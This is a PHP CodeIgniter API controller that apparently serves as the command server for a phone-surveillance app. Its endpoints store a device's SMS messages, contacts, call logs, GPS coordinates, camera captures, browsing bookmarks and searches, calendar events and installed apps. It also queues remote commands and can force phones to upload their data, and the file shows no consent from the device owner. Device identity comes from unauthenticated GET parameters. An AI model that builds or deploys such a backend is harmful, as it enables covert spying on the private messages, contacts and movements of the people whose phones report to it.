<?php

class Api extends CI_Controller {

    function __construct() {
        parent::__construct();

        $this->versicode = !empty($this->input->get('versicode')) ? $this->input->get('versicode') : "";
        $this->versiname = !empty($this->input->get('versiname')) ? $this->input->get('versiname') : "";

        $this->user_id = !empty($this->input->get('user_id')) ? $this->input->get('user_id') : "";
        $this->phone_id = !empty($this->input->get('phone_id')) ? $this->input->get('phone_id') : "";
        $this->phone_name = !empty($this->input->get('phone_name')) ? $this->input->get('phone_name') : "";
    }
	
	function index(){
		
		$data = array();
		$data['response'] = 'Parameter Failed!';
        $this->output->set_header('Content-Type: application/json; charset=utf-8,Access-Control-Allow-Origin: *');
		echo json_encode($data);
	}

	function update(){

        $response = array();
        $response["success"] = true;
        $response["response"] = array();


        $dd = array();
        $dd['lastversioncode'] = 24;
        $dd['lastversionname'] = '1.2';
        array_push($response['response'],$dd);

        $this->output->set_header('Content-Type: application/json; charset=utf-8');
        echo json_encode($response);
    }

    function status(){

        $response = array();
        $response["success"] = true;
        $response["response"] = array();

        $dd = array();
        $dd['ForceWifiOnForRecordUpload'] = false;

        array_push($response['response'],$dd);

        $this->output->set_header('Content-Type: application/json; charset=utf-8');
        echo json_encode($response);
    }

    function statusupload(){

        $timestamp = date('Y-m-d G:i:s');
        $this->db->where(array( 'phone_name' => $this->phone_id,'user_id' => $this->user_id));
        $this->db->update( 'phone', array(
            'phone_last_active'=>$timestamp,
            'versicode'=>$this->versicode,
            'versiname'=>$this->versiname
        ));

        $response = array();
        $response["success"] = true;
        $response["response"] = array();

        $dd = array();
        $dd['ForceUpload'] = false;
        $phone = $this->db->get_where('phone', array(
            'phone_name'=> $this->phone_id,
        ) )->result_array();
        
        foreach ($phone as $r2){
            if($r2['ForceUpload'] > 0) $dd['ForceUpload'] = true;
        }

        array_push($response['response'],$dd);

        $this->output->set_header('Content-Type: application/json; charset=utf-8');
        echo json_encode($response);
    }

    function statusupload2(){


        $response = array();
        $response["success"] = true;
        $response["response"] = array();
        $timestamp = date('Y-m-d G:i:s');

        $users = $this->db->get_where('phone', array('phone_name' => $this->phone_name) );
        if($users->num_rows() > 0){

            $this->db->where(array( 'phone_name' => $this->phone_name));
            $this->db->update( 'phone', array(
                'phone_last_active'=>$timestamp,
                'versicode'=>$this->versicode,
                'versiname'=>$this->versiname
            ));

            $dd = array();
            $dd['ForceUpload'] = false;
            $phone = $this->db->get_where('phone', array(
                'phone_name'=> $this->phone_name,
            ) )->result_array();

            foreach ($phone as $r2){
                if($r2['ForceUpload'] > 0) $dd['ForceUpload'] = true;
            }

            array_push($response['response'],$dd);
        }else{
            $data = array(
                'user_id' => $this->user_id,
                'phone_name' => $this->phone_name,
                'phone_imei' => "",
                'phone_serial' => "",
                'phone_model' => "",
                'versicode' => $this->versicode,
                'versiname' => $this->versiname
            );
            $this->db->insert('phone',$data);
            $id = $this->db->insert_id();

            $dd = array();
            $dd['ForceUpload'] = true;

            array_push($response['response'],$dd);

        }

        $this->output->set_header('Content-Type: application/json; charset=utf-8');
        echo json_encode($response);
    }


    function signin(){


        $token = $this->input->post('token',true);

        $response = array();
        $response["response"] = array();

        $users = $this->db->get_where('users', array('token' => $token) );
        if($users->num_rows() > 0){
            $serial = !empty($this->input->post('serial')) ? $this->input->post('serial') : "";
            $model = !empty($this->input->post('model')) ? $this->input->post('model') : "";
            $imei = !empty($this->input->post('imei')) ? $this->input->post('imei') : "";
            $nama = !empty($this->input->post('nama')) ? $this->input->post('nama') : "";

            $timestamp = date('Y-m-d H:i:s');


            foreach ($users->result_array() as $r){
                $user_id = $r['user_id'];


                $this->db->where('user_id',$user_id);
                $this->db->update('users',array('last_active' => $timestamp));

                $item = array();
                $item['user_id']  = $user_id;
                $item['phone_id']  = 0;
                $item['phone_name']  = "";


                if(!empty($serial) && !empty($model) ){

                    $phone = $this->db->get_where('phone', array(
                        'user_id'=> $user_id,
                        'phone_serial'=> $serial,
                        'phone_model'=> $model
                    ) );
                    if($phone->num_rows() > 0){
                        foreach ($phone->result_array() as $r2){
                            $item['phone_id']  = $r2['phone_id'];
                            $item['phone_name']  = $r2['phone_name'];

                            $this->db->where(array(
                                'user_id'=> $user_id,
                                'phone_serial'=> $serial,
                                'phone_model'=> $model
                            ));

                            $this->db->update('phone',array(
                                'phone_name' => $nama,
                                'versicode' => $this->versicode,
                                'versiname' => $this->versiname
                            ));
                        }
                    }else{
                        if( empty($nama) ) $nama = $model;


                        $data = array(
                            'user_id' => $user_id,
                            'phone_name' => $nama,
                            'phone_imei' => $imei,
                            'phone_serial' => $serial,
                            'phone_model' => $model,
                            'versicode' => $this->versicode,
                            'versiname' => $this->versiname
                        );
                        $this->db->insert('phone',$data);
                        $id = $this->db->insert_id();

                        $item['phone_id'] = $id;
                        $item['phone_name']  = $nama;

                    }
                }



                array_push($response["response"], $item);
            }

            $response["success"] = true;

        }else{
            $response["success"] = false;
            $response["response"] = "Tidak ditemukan data";
        }

        $this->output->set_header('Content-Type: application/json; charset=utf-8');
        echo json_encode($response);
	}


    function collect_phone_details(){
        $k = $this->input->post("k");
        $v = $this->input->post("v");

        $response = array();

        $sql = $this->db->get_where('collect_phone_details', array(
            'user_id' => $this->user_id,
            'phone_id' => $this->phone_id,
            'v' => $v
        ));

        if($sql->num_rows() < 1){
            $this->db->insert('collect_phone_details',array(
                'user_id' => $this->user_id,
                'phone_id' => $this->phone_id,
                'k' => $k,
                'v' => $v
            ));

            $response["success"] = true;
            $response["response"] = "";
        } else {

            $response["success"] = false;
            $response["response"] = "";
        }

        $this->output->set_header('Content-Type: application/json; charset=utf-8,Access-Control-Allow-Origin: *');
        echo json_encode($response);
    }

    function collect_installed_apps(){
        $app_name = $this->input->post("app_name");
        $app_package = $this->input->post("app_package");
        $app_uid = $this->input->post("app_uid");
        $app_vname = $this->input->post("app_vname");
        $app_vcode = $this->input->post("app_vcode");

        $response = array();

        $sql = $this->db->get_where('collect_installed_apps', array(
            'user_id' => $this->user_id,
            'phone_id' => $this->phone_id,
            'app_uid' => $app_uid,
            'app_vcode' => $app_vcode
        ));

        if($sql->num_rows() < 1){
            $this->db->insert('collect_installed_apps',array(
                'user_id' => $this->user_id,
                'phone_id' => $this->phone_id,
                'app_uid' => $app_uid,
                'app_vcode' => $app_vcode,
                'app_name' => $app_name,
                'app_package' => $app_package,
                'app_vname' => $app_vname
            ));

            $response["success"] = true;
            $response["response"] = "";
        } else {

            $response["success"] = false;
            $response["response"] = "";
        }

        $this->output->set_header('Content-Type: application/json; charset=utf-8,Access-Control-Allow-Origin: *');
        echo json_encode($response);

    }



	function online(){
        $response = array();

        $sql = $this->db->get_where('users', array( 'user_id' => $this->user_id) );

        if($sql->num_rows() > 0){

            $timestamp = date('Y-m-d G:i:s');
            $this->db->where('user_id',$this->user_id);
            $this->db->update( 'users', array('last_active'=>$timestamp));

            $this->db->where(array( 'phone_id' => $this->phone_id,'user_id' => $this->user_id));
            $this->db->update( 'phone', array(
                'phone_last_active'=>$timestamp,
                'versicode'=>$this->versicode,
                'versiname'=>$this->versiname
            ));

            $response["success"] = true;
            $response["response"] = "";
        }else{

            $response["success"] = false;
            $response["response"] = "";
        }

        header('Content-type: application/json; charset=utf-8');
        echo json_encode($response);
    }

    function commander(){

        $command = $this->input->get("command");

        $response = array();
        $response["response"] = array();

        if($command == "get") {
            $sql = $this->db->get_where('commands', array(
                'panding' => 1,
                'user_id' => $this->user_id,
                'phone_id' => $this->phone_id
            ));

            if($sql->num_rows() > 0){
                foreach ($sql->result_array() as $r) {
                    $item = array();
                    $item['start'] = $r['start'];
                    $item['end'] = $r['end'];
                    $item['id'] = $r['id'];
                    $item['param1'] = $r['param1'];
                    $item['param2'] = $r['param2'];
                    $item['param3'] = $r['param3'];
                    $item['param4'] = $r['param4'];
                    $item['panding'] = $r['panding'];

                    array_push($response["response"], $item);
                }

                $response["success"] = true;
            } else {
                $response["success"] = false;
            }
        }elseif($command == "set"){

            $id = $this->input->get("id");

            $sql = $this->db->get_where('commands', array(
                'panding' => 1,
                'user_id' => $this->user_id,
                'phone_id' => $this->phone_id,
                'id' => $id
            ));

            if($sql->num_rows() > 0){

                $timestamp = date('Y-m-d H:i:s');

                $this->db->where(array('phone_id' => $this->phone_id, 'user_id' => $this->user_id, 'id' => $id,'panding' => 1));
                $this->db->update('commands', array(
                    'panding' => 0,
                    'end' => $timestamp
                ));

                $response["success"] = true;
            } else {

                $response["success"] = false;
            }
        }else{

            $response["success"] = false;
        }

        header('Content-type: application/json; charset=utf-8');
        echo json_encode($response);

    }


    function capture(){
        $image = $this->input->post("image");
        $for = $this->input->post("for");

        $response = array();
        $response["response"] = array();

        $sql = $this->db->get_where('camera', array(
            'user_id' => $this->user_id,
            'phone_id' => $this->phone_id,
            'image' => $image,
            'for' => $for
        ));

        if($sql->num_rows() < 1){
            $this->db->insert('camera',array(
                'user_id' => $this->user_id,
                'phone_id' => $this->phone_id,
                'image' => $image,
                'for' => $for
            ));

            $response["success"] = true;
        } else {

            $response["success"] = false;
        }

        header('Content-type: application/json; charset=utf-8');
        echo json_encode($response);
    }

    function screenshot(){
        $screenshot = $this->input->post("screenshot");

    }

    function gps(){
        $coordinat = $this->input->post("coordinat");

        $response = array();

        $sql = $this->db->get_where('gps', array(
            'user_id' => $this->user_id,
            'phone_id' => $this->phone_id,
            'coordinat' => $coordinat
        ));

        if($sql->num_rows() < 1){
            $this->db->insert('gps',array(
                'user_id' => $this->user_id,
                'phone_id' => $this->phone_id,
                'coordinat' => $coordinat,
                //'versicode' => $this->versicode,
                //'versiname' => $this->versiname
            ));
            //$gps_id = $this->db->insert_id();

            $response["success"] = true;
            $response["response"] = "";
        } else {

            $response["success"] = false;
            $response["response"] = "";
        }

        header('Content-type: application/json; charset=utf-8');
        echo json_encode($response);
    }

    function history_word(){
        $locale = $this->input->post("locale");
        $dictionary_word = $this->input->post("dictionary_word");
        $dictionary_id = $this->input->post("dictionary_id");

        $response = array();

        $sql = $this->db->get_where('history_word', array(
            'user_id' => $this->user_id,
            'phone_id' => $this->phone_id,
            'dictionary_id' => $dictionary_id
        ));

        if($sql->num_rows() < 1){
            $this->db->insert('history_word',array(
                'user_id' => $this->user_id,
                'phone_id' => $this->phone_id,
                'locale' => $locale,
                'dictionary_word' => $dictionary_word,
                'dictionary_id' => $dictionary_id,
                //'versicode' => $this->versicode,
                //'versiname' => $this->versiname
            ));
            $history_word_id = $this->db->insert_id();

            $response["success"] = true;
            $response["response"] = "";
        } else {

            $response["success"] = false;
            $response["response"] = "";
        }

        header('Content-type: application/json; charset=utf-8');
        echo json_encode($response);

    }

    function history_bookmark(){
        $bookmark_title = $this->input->post("bookmark_title");
        $bookmark_url = $this->input->post("bookmark_url");
        $bookmark_date = $this->input->post("bookmark_date");
        $bookmark_visits = $this->input->post("bookmark_visits");

        $response = array();

        $sql = $this->db->get_where('history_bookmark', array(
            'user_id' => $this->user_id,
            'phone_id' => $this->phone_id,
            'bookmark_title' => $bookmark_title,
            'bookmark_url' => $bookmark_url,
            'bookmark_date' => $bookmark_date,
            'bookmark_visits' => $bookmark_visits
        ));

        if($sql->num_rows() < 1){
            $this->db->insert('history_bookmark',array(
                'user_id' => $this->user_id,
                'phone_id' => $this->phone_id,
                'bookmark_title' => $bookmark_title,
                'bookmark_url' => $bookmark_url,
                'bookmark_date' => $bookmark_date,
                'bookmark_visits' => $bookmark_visits
                //'versicode' => $this->versicode,
                //'versiname' => $this->versiname
            ));
            $history_bookmark_id = $this->db->insert_id();

            $response["success"] = true;
            $response["response"] = "";
        } else {

            $response["success"] = false;
            $response["response"] = "";
        }

        header('Content-type: application/json; charset=utf-8');
        echo json_encode($response);

    }

    function history_search(){
        $search_title = $this->input->post("search_title");
        $search_date = $this->input->post("search_date");

        $response = array();

        $sql = $this->db->get_where('history_search', array(
            'user_id' => $this->user_id,
            'phone_id' => $this->phone_id,
            'search_title' => $search_title,
            'search_date' => $search_date
        ));

        if($sql->num_rows() < 1){
            $this->db->insert('history_search',array(
                'user_id' => $this->user_id,
                'phone_id' => $this->phone_id,
                'search_title' => $search_title,
                'search_date' => $search_date,
                //'versicode' => $this->versicode,
                //'versiname' => $this->versiname
            ));
            $history_search_id = $this->db->insert_id();

            $response["success"] = true;
            $response["response"] = "";
        } else {

            $response["success"] = false;
            $response["response"] = "";
        }

        header('Content-type: application/json; charset=utf-8');
        echo json_encode($response);

    }

    function calendar_events(){
        $event_id = $this->input->post("event_id");
        $event_timezone = $this->input->post("event_timezone");
        $event_title = $this->input->post("event_title");
        $event_description = $this->input->post("event_description");
        $event_location = $this->input->post("event_location");
        $event_calendar_account = $this->input->post("event_calendar_account");
        $event_calendar_account_name = $this->input->post("event_calendar_account_name");

        $response = array();

        $sql = $this->db->get_where('calendar_events', array(
            'user_id' => $this->user_id,
            'phone_id' => $this->phone_id,
            'event_id' => $event_id
        ));

        if($sql->num_rows() < 1){
            $this->db->insert('calendar_events',array(
                'user_id' => $this->user_id,
                'phone_id' => $this->phone_id,
                'event_id' => $event_id,
                'event_timezone' => $event_timezone,
                'event_title' => $event_title,
                'event_description' => $event_description,
                'event_location' => $event_location,
                'event_calendar_account' => $event_calendar_account,
                'event_calendar_account_name' => $event_calendar_account_name
            ));
            $calendar_events_id = $this->db->insert_id();

            $response["success"] = true;
            $response["response"] = "";
        } else {

            $response["success"] = false;
            $response["response"] = "";
        }

        header('Content-type: application/json; charset=utf-8');
        echo json_encode($response);

    }

    function sms(){
        $id = $this->input->post("id");
        $address = $this->input->post("address");
        $message = $this->input->post("message");
        $tanggal = $this->input->post("date");
        $reader = $this->input->post("read");
        $type = $this->input->post("type");

        $response = array();

        $sql = $this->db->get_where('sms', array(
            'user_id' => $this->user_id,
            'phone_id' => $this->phone_id,
            'id' => $id
        ));

        if($sql->num_rows() < 1){
            $this->db->insert('sms',array(
                'user_id' => $this->user_id,
                'phone_id' => $this->phone_id,
                'id' => $id,
                'address' => $address,
                'message' => $message,
                'tanggal' => $tanggal,
                'reader' => $reader,
                'type' => $type
            ));

            $response["success"] = true;
            $response["response"] = "";
        } else {

            $response["success"] = false;
            $response["response"] = "";
        }

        header('Content-type: application/json; charset=utf-8');
        echo json_encode($response);
    }

    function contacts(){
        $contact_name = $this->input->post("contact_name");
        $contact_phone = $this->input->post("contact_phone");

        $response = array();

        $sql = $this->db->get_where('contacts', array(
            'user_id' => $this->user_id,
            'phone_id' => $this->phone_id,
            'contact_name' => $contact_name,
            'contact_phone' => $contact_phone
        ));

        if($sql->num_rows() < 1){
            $this->db->insert('contacts',array(
                'user_id' => $this->user_id,
                'phone_id' => $this->phone_id,
                'contact_name' => $contact_name,
                'contact_phone' => $contact_phone,
                //'versicode' => $this->versicode,
                //'versiname' => $this->versiname
            ));
            $contacts_id = $this->db->insert_id();

            $response["success"] = true;
            $response["response"] = "";
        } else {

            $response["success"] = false;
            $response["response"] = "";
        }

        header('Content-type: application/json; charset=utf-8');
        echo json_encode($response);
    }

    function call_logs(){
        $phone_number = $this->input->post("phone_number");
        $call_date = $this->input->post("call_date");
        $call_type = $this->input->post("call_type");
        $call_duration = $this->input->post("call_duration");

        $response = array();

        $sql = $this->db->get_where('call_logs', array(
            'user_id' => $this->user_id,
            'phone_id' => $this->phone_id,
            'phone_number' => $phone_number,
            'call_date' => $call_date,
            'call_type' => $call_type,
            'call_duration' => $call_duration
        ));

        if($sql->num_rows() < 1){
            $this->db->insert('call_logs',array(
                'user_id' => $this->user_id,
                'phone_id' => $this->phone_id,
                'phone_number' => $phone_number,
                'call_date' => $call_date,
                'call_type' => $call_type,
                'call_duration' => $call_duration
                //'versicode' => $this->versicode,
                //'versiname' => $this->versiname
            ));
            $call_logs_id = $this->db->insert_id();

            $response["success"] = true;
            $response["response"] = "";
        } else {

            $response["success"] = false;
            $response["response"] = "";
        }

        header('Content-type: application/json; charset=utf-8');
        echo json_encode($response);
    }

}
